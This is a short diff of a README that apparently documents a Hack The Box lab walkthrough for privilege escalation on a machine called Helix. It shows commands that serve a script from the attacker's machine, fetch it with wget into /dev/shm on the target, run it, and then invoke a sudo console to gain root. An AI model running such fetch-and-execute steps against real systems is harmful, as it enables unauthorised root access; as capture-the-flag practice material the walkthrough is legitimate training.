@@ -9,13 +9,14 @@ cd Helix_PrivilegeEscal_toRoot
 python3 -m http.server 80
 ```
 
-### Inside Helix terminal (SSH use 'operator')
+### Inside Helix terminal
 
 ```sh
 wget http://(YOUR_HTB_IP)/privilege_escalationHelix.py /dev/shm
 python3 /dev/shm/privilege_escalationHelix.py
 ```
-(wait the process)
+(Wait the process)
 ```sh
 sudo helix-maint-console
 ```
+### Sudo access gained
